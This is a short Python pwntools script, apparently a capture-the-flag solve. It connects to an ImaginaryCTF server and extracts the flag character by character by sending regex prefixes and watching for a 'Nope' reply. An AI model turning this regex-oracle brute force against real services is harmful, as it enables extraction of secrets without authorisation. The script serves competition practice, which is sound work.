from pwn import *

# connect to the server
r = remote('puzzler7.imaginaryctf.org', 7000)

# function to read one line at a time
def readline():
    return r.recvline().decode('utf-8')

# function to write string to server
def sendline(s):
    r.sendline(s.encode('utf-8'))

flag_end = '}'

flag = ''

letters = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '{', '}',
    '!', '@', '#', '\$', '%', '\^', '&', '\*', '(', ')', '-', '\+', '=',
    '{', '}', '|', ';', ':', ',', '\.', '<', '>', '\?', '/', '~'
]

currentLetter = 0

while flag_end not in flag and currentLetter < len(letters):
    sendline(flag + letters[currentLetter] + ".*")
    response = readline()
    if 'Nope' in response:
        currentLetter += 1
    else:
        print(response, end='')
        print(flag)
        flag += letters[currentLetter]
        currentLetter = 0